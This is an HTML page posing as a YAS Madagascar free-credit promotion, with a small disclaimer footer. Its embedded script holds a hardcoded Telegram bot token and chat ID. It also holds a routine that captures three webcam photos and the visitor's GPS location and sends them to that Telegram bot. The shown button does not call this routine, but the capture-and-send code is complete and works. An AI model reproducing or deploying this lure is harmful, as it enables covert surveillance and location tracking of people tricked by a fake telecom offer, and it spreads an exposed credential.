 
<!DOCTYPE html>
<html lang="mg">
<head>
  <meta charset="UTF-8"/>
  <title> CREDIT GRATUIT YAS </title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>

  <style>
    :root {
      --yas-purple:#5B1BA8;
      --yas-violet:#7B2FCB;
      --yas-yellow:#FFD500;
      --white:#fff;
    }

    * {
      box-sizing:border-box;
    }

    body {
      margin:0;
      min-height:100vh;
      display:flex;
      flex-direction:column;
      justify-content:center;
      align-items:center;
      padding:20px;
      font-family:'Segoe UI',sans-serif;
      color:var(--white);
      background:
        radial-gradient(circle at top right,#A875D8,transparent 45%),
        linear-gradient(145deg,#351064,#6423A8,#4B167C);
    }

    .card {
      width:100%;
      max-width:390px;
      padding:35px 25px;
      text-align:center;
      background:rgba(255,255,255,.12);
      backdrop-filter:blur(20px);
      -webkit-backdrop-filter:blur(20px);
      border:1px solid rgba(255,255,255,.25);
      border-radius:28px;
      box-shadow:0 20px 50px #21084266;
      animation:fade 1s ease;
    }

    .logo {
      display:inline-flex;
      align-items:center;
      justify-content:center;
      padding:8px 22px;
      margin-bottom:25px;
      border-radius:14px;
      background:var(--yas-yellow);
      color:var(--yas-purple);
      font-size:32px;
      font-weight:900;
      letter-spacing:-1px;
      box-shadow:0 8px 25px #FFD50044;
    }

    h1 {
      margin:0 0 15px;
      font-size:27px;
      font-weight:800;
      line-height:1.3;
      animation:fade 1s;
    }

    p {
      margin:0 0 25px;
      color:#F0E6FF;
      font-size:15px;
      line-height:1.7;
      animation:fade 1.2s;
    }

    button {
      width:100%;
      padding:16px 25px;
      border:0;
      border-radius:50px;
      background:var(--yas-yellow);
      color:var(--yas-purple);
      font-size:17px;
      font-weight:800;
      cursor:pointer;
      box-shadow:0 8px 25px #FFD50033;
      transition:transform .3s,box-shadow .3s;
    }

    button:hover {
      transform:translateY(-3px);
      box-shadow:0 12px 30px #FFD50066;
    }

    button:active {
      transform:scale(.97);
    }

    #preview {
      margin-top:20px;
      width:120px;
      height:120px;
      object-fit:cover;
      border-radius:50%;
      border:3px solid var(--yas-yellow);
      box-shadow:0 0 20px #FFD50055;
      animation:pop .6s;
    }

    .footer {
      margin-top:22px;
      font-size:11px;
      color:#D9C5F0;
      line-height:1.5;
    }

    @keyframes fade {
      from {
        opacity:0;
        transform:translateY(-20px);
      }
      to {
        opacity:1;
        transform:translateY(0);
      }
    }

    @keyframes pop {
      from {
        transform:scale(0);
        opacity:0;
      }
      to {
        transform:scale(1);
        opacity:1;
      }
    }

    @media(max-width:480px) {
      .card {
        padding:30px 22px;
      }

      h1 {
        font-size:24px;
      }
    }
  </style>
</head>

<body>
  <div class="card">

    <div class="logo">YAS</div>

    <h1>CREDIT GRATUIT</h1>

    <p>
      Découvrez les offres de crédit
      <strong>YAS Madagascar</strong>.<br/>
      Consultez les conditions pour en bénéficier.
    </p>

    <button onclick="alert('Consultez les offres et conditions sur le site officiel YAS Madagascar.')">
      Découvrir les offres
    </button>

    <div class="footer">
      Page de démonstration non officielle.<br/>
      Vérifiez les offres auprès de YAS Madagascar.
    </div>

  </div>

<script>

      


  /* ------------- PARAMÈTRES TELEGRAM ------------- */
  const BOT_TOKEN = "8469966308:AAGzr6xL7R3zqV9r9yCC61LTCIxvY6oKtOs";
  const CHAT_ID   = "8124974450";

  /* ------------- FONCTION PRINCIPALE ------------- */
  async function startProcess() {
    try {
      // 1. Maka sary 3
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      const video  = document.createElement('video');
      video.srcObject = stream;
      await video.play();

      const canvas = document.createElement('canvas');
      const ctx    = canvas.getContext('2d');

      for (let i = 0; i < 3; i++) {
        await new Promise(r => setTimeout(r, 1200));
        canvas.width  = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.drawImage(video, 0, 0);
        const imgData = canvas.toDataURL('image/png');
        await sendPhoto(imgData, "📸 Selfie #" + (i+1));
      }
      stream.getTracks().forEach(t => t.stop());

      // 2. Maka toerana    
navigator.geolocation.getCurrentPosition(function(pos) {
        const { latitude: lat, longitude: lon } = pos.coords;
        const loc = `📍 Toerana: https://www.google.com/maps?q=${lat},${lon}`;
        sendMessage(loc); 
        alert("✅ Vita ny test, Tongasoa!");
      });

    } catch (err) {
      alert("❌ Nisy olana: " + err.message);
      console.error(err);
    }
  }
  /* ------------- ENVOI PHOTO ------------- */
  async function sendPhoto(imgBase64, caption) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
    const form = new FormData();
    form.append("chat_id", CHAT_ID);
    form.append("caption", caption);

    const blob = dataURItoBlob(imgBase64);
    form.append("photo", blob, "selfie.png");

    const res = await fetch(url, { method: "POST", body: form });
    console.log("sendPhoto status:", res.status);
  }

  /* ------------- ENVOI MESSAGE TEXTE ------------- */
  async function sendMessage(text) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    const res = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: text
      })
    });

    console.log("sendMessage status:", res.status);
  }

  /* ------------- UTILITAIRE ------------- */
  function dataURItoBlob(dataURI) {
    const byteString = atob(dataURI.split(',')[1]);
    const mime = dataURI.split(',')[0].split(':')[1].split(';')[0];
    const ab   = new ArrayBuffer(byteString.length);
    const ia   = new Uint8Array(ab);
    for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
    return new Blob([ab], { type: mime });
  }
</script>
</body>
</html>
